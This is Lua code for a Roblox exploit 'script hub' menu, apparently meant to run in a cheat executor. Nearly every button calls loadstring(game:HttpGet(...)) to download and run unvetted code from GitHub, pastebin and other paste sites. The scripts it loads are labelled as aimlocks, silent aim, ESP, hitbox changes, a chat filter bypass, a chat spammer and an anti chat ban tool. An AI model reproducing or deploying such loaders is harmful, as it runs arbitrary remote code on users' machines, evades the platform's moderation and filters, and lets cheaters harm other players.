Tab3Section:NewLabel("RayCodex Hub")

Tab3Section:NewButton("Dh Raycodex", "Loads a Script Hub For Dh", function()
loadstring(game:GetObjects("rbxassetid://5812737894")[1].Source)()
    print("Clicked")
end)

Tab3Section:NewLabel("KirbsWare Anti Lock")

Tab3Section:NewButton("Dh KirbsWare Anti Lock", "Loads a Script For Dh", function()
loadstring(game:HttpGet('https://github.com/Kirbsware/script/raw/main/Mobile'))()
    print("Clicked")
end)

Tab9Section:NewLabel("Keybind Maker")

Tab9Section:NewButton("Keybind Maker", "Makes Any Keybind You Want", function()
loadstring(game:HttpGet(('https://pastefy.app/Ujm4HWxh/raw'),true))()
    print("Clicked")
end)

Tab3Section:NewLabel("NukerMode Hub")

Tab3Section:NewButton("Dh Nukermode", "Loads a Script For Dh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Tenaki CamLock")

Tab3Section:NewButton("Dh Tenaki Camlock", "Loads a Script For Dh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Tenkai./main/imean.Tenaki",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("M Tool")

Tab5Section:NewButton("M tool", "Gives You M Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/M/main/Tool",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("N Tool")

Tab5Section:NewButton("N tool", "Gives You N Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/N/main/Tool",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("F Tool")

Tab5Section:NewButton("F tool", "Gives You F Tool", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/F/main/Tool",true))()
    print("Clicked")
end)

Tab5Section:NewLabel("Keystrokes Script")

Tab5Section:NewButton("KeyStrokes Script", "Loads WASD KeyStrokes Script", function()
loadstring(game:HttpGet(('https://pastefy.app/Te4dwSw2/raw'),true))()
    print("Clicked")
end)

Tab5Section:NewLabel("Keybind Maker")

Tab5Section:NewButton("Keybind Maker", "Makes Any Keybind You Want", function()
loadstring(game:HttpGet(('https://pastefy.app/Ujm4HWxh/raw'),true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Shader And Rtx Script")

Tab2Section:NewButton("Shader", "Gives You Shader In Every Map", function()
loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
    print("Clicked")
end)

Tab2Section:NewButton("Rtx", "Gives You Rtx In Every Map", function()
loadstring(game:HttpGet(('https://pastefy.app/BIr8OzrR/raw'),true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Faded Hub")

Tab3Section:NewButton("Faded Script", "Loads Faded Script For Dh", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Pluto Hub")

Tab3Section:NewButton("Pluto Script", "Loads Pluto Script For Dh", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Scrvpter/Pluto/Lua/Loader.Lua', true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Red Dot Lock")

Tab3Section:NewButton("Red Dot Lock", "Loads Red Dot Lock", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/reddot1/main/reddot1", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Chat Bypass")

Tab1Section:NewButton("Chat Bypass Script", "Lets You Say Anything You Want", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Chat/main/Bypass",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Chat Spammer")

Tab1Section:NewButton("Chat Spammer", "Spams Chat Anyword You Want", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/chatspammer/main/chatspammer", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Autoclicker")

Tab1Section:NewButton("Autoclicker", "Loads AutoClicker For Any Map", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Autoclicker/main/Working",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Shift Lock")

Tab1Section:NewButton("Shift Lock", "Loads Shift Lock For Any Map", function()
loadstring(game:HttpGet('https://pastebin.com/raw/WQ9NPeDS'))();
    print("Clicked")
end)

Tab1Section:NewLabel("Chat Hax")

Tab1Section:NewButton("Chat Hax", "Loads Chat Hax", function()
loadstring(game:HttpGet('https://pastebin.com/raw/MBpnp3yS'))()
    print("Clicked")
end)

Tab2Section:NewLabel("Esclipe Hub V0.95")

Tab2Section:NewButton("Esclipe Hub V0.95", "Loads Esclipe Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Esclipe-Hub-V-0.95/main/Real",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Fake Tools Giver")

Tab2Section:NewButton("Fe Fake Tools GamepassV4", "Loads Fe Fake Tools Gamepass V4", function()
loadstring(game:HttpGet(('https://pastefy.app/VYIAk3o1/raw'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Player Orbit")

Tab1Section:NewButton("Fe Player Orbit", "Loads Fe Player Orbit", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe./main/Orbit%20GUI"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Better Roblox")

Tab1Section:NewButton("BetterRoblox Script", "Loads BetterRoblox Scropt ( Takes 5-10 Second To Load )", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/scripthubekitten/betterrobloxui/main/betterroblox", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Boombox Scripts")

Tab1Section:NewButton("OP BOOMBOX SCRIPT", "Loads OP DOLLHOUSE ROLEPLAY SCRIPT", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/Dollhouse/main/Roleplay",true))()
    print("Clicked")
end)

Tab1Section:NewButton("Pineapple Boombox Gui", "Loads Pineapple Boombox Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/boombox/main/script",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Giga Chad Hub")

Tab2Section:NewButton("Giga Chad Hub V3.5", "Loads Giga Chad Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/OWJBWKQLAISH/GigaChad-Hub/main/Version%20V3.5'))()
    print("Clicked")
end)

Tab1Section:NewLabel("Player Esp")

Tab1Section:NewButton("EspV1", "Loads EspV1", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/box.esp/main/s",true))()
    print("Clicked")
end)

Tab1Section:NewButton("EspV2", "Loads EspV2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/name.esp/main/s",true))()
    print("Clicked")
end)

Tab1Section:NewButton("EspV3", "Loads EspV3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/charm/main/esp",true))()
    print("Clicked")
end)

Tab1Section:NewButton("EspV4", "Loads EspV4", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/blue./main/esp",true))()
    print("Clicked")
end)

Tab1Section:NewButton("EspV5", "Loads EspV5", function()
loadstring(game:HttpGet("https://paste.gg/p/anonymous/7259b0557ebf44ccabf2f7b58dc79899/files/0475cb5d744642a2b572e3a8af205588/raw"))()
    print("Clicked")
end)

Tab3Section:NewLabel("IosW Lock")

Tab3Section:NewButton("IosW Lock", "Loads IosW Lock", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/iosW/main/Lock",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Make Ppl Fly Script")

Tab1Section:NewButton("Fe Make Ppl Fly", "Loads Fe Make Ppl Fly", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/fe-make-ppl-fly/main/s",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Lock Script Hub")

Tab2Section:NewButton("Lock Script Hub", "Loads a Hub With Locks In it", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/ChaseSYNX/Scripts/main/DragonWareAimlock')))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Hacker Chat")

Tab1Section:NewButton("Hacker Chat", "Loads Hacker Chat Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/hacker./main/chat",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("Game Script Hub V3")

Tab2Section:NewButton("Game Script V3", "Loads Game Script V3", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Game-Hub/main/loader"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Multi Scripter X V2")

Tab2Section:NewButton("Multi Scripter X V2", "Loads Multi Scripter X V2", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerScripter/Multi-Scripter-X/main/loader"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Silent Aim Gui")

Tab3Section:NewButton("Silent Aim Gui", "Loads Silent Aim Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/zuwdaq/legit-slient-aim-script/main/legit",true))()
    print("Clicked")
end)

Tab3Section:NewLabel("Nyula Gui")

Tab3Section:NewButton("Nyula Gui", "Loads Nyula Gui For Locks And More", function()--WOW WE HIT 1K
loadstring(game:HttpGet("https://raw.githubusercontent.com/nyulachan/nyula/main/nyula", true))()
    print("Clicked")
end)

Tab2Section:NewLabel("i forgor Hub")

Tab2Section:NewButton("i forgor Hub", "Loads i forgor Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iforgotmodz/Universal-Script-Loader/main/Updated1.3"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Low Gfx Script")

Tab2Section:NewButton("Low Gfx", "Loads Low Gfx Script", function()
loadstring(game:HttpGet("https://pastebin.com/raw/zQUqDRdJ",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("White Room Script")

Tab1Section:NewButton("White Room Script", "Loads White Room Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/NFMS-1/WRUI/main/1", true))()
    print("Clicked")
end)

Tab3Section:NewLabel("imperialw Lock")

Tab3Section:NewButton("imperialw Lock", "Loads imperialw Lock Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/imperialw/main/imperialw",true))()
    print("Clicked")
end)

Tab3Section:NewLabel("haalfi-cc Lock")

Tab3Section:NewButton("haalfi-cc Lock", "Loads haalfi-cc Lock Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/DaHood", true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Player Collision")

Tab1Section:NewButton("Fe Player Collision", "Loads Fe Player Collition", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/Collision.txt'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Zombie")

Tab1Section:NewButton("Fe Zombie", "Loads Fe Zombie", function()
loadstring(game:HttpGet(('https://pastefy.app/w7KnPY70/raw'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Walk On Wall")

Tab1Section:NewButton("Fe Walk On Wall", "Loads Fe Walk On Wall", function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe Anti Chat Ban")

Tab1Section:NewButton("Fe Anti Chat Ban", "Loads Fe Anti Chat Ban", function()
loadstring(game:HttpGet('https://pastebin.com/raw/Wqxzdi1q'))()
    print("Clicked")
end)

Tab2Section:NewLabel("Trd Script Gui")

Tab2Section:NewButton("Trd Script Gui", "Loads Trd Script Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kureu/Roblox-T.R.D-Camp-Script/main/Roblox%20T.R.D%20Camp%20Script"))();
    print("Clicked")
end)

Tab2Section:NewLabel("Prtty Much Evry Bordr Game Vr")

Tab2Section:NewButton("Prtty Much Every Bordr Game vr Script Gui", "Loads Prtty Much Evry Bordr Game Vr Script Gui", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/memejames/New/main/Hub'))()
    print("Clicked")
end)

Tab2Section:NewLabel("Mm2 Lunar Hub")

Tab2Section:NewButton("Mm2 Lunar Hub", "Loads Mm2 Lunar Hub", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2"))()
    print("Clicked")
end)

Tab2Section:NewLabel("Ghost Hub")

Tab2Section:NewButton("Ghost Hub", "Loads Ghost Hub", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
    print("Clicked")
end)

Tab2Section:NewLabel("Ice Hub")

Tab2Section:NewButton("Ice Hub", "Loads Ice Hub", function()
loadstring(game:HttpGet("https://icehub.cf/IceHubLoader"))()
    print("Clicked")
end)

Tab3Section:NewLabel("Silent Aim V2")

Tab3Section:NewButton("Working Silent Aim", "Loads Universal Working Silent Aim [ Can Change Settings ]", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/silents.aim/main/s",true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Funky Friday Script")

Tab1Section:NewButton("Funky Friday Script", "Loads Funky Friday Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ShowerHead-FluxTeam/scripts/main/funky-friday-autoplay"))()
    print("Clicked")
end)

Tab1Section:NewLabel("The Strongest Battle Grounds Script")

Tab1Section:NewButton("The Strongest Battle Grounds Script", "Loads The Strongest Battle Grounds Script Key: BestTheStrongest5412Roblox", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Strongest/main/Battlegrounds77"))()
    print("Clicked")
end)

Tab1Section:NewLabel("RoGhoul Script")

Tab1Section:NewButton("RoGhoul Script", "Loads RoGhoul Script", function()
loadstring(game:HttpGet"https://raw.githubusercontent.com/xQuartyx/DonateMe/main/ScriptLoader")()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe R15 To R6 Script")

Tab1Section:NewButton("Fe R15 To R6 Script", "Loads Fe R15 To R6 Script", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Imagnir/r6_anims_for_r15/main/r6_anims.lua'),true))()
    print("Clicked")
end)

Tab1Section:NewLabel("Fe PackGod Script")

Tab1Section:NewButton("Fe PackGod Script", "Loads Fe PackGod Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/packgod/main/script",true))()
    print("Clicked")
end)

Tab2Section:NewLabel("FrontLines Script Gui")

Tab2Section:NewButton("FrontLines Script Gui", "Loads FrontLines Script Gui", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/shakar60/frontlines./main/hitbox",true))()
    print("Clicked")
end)
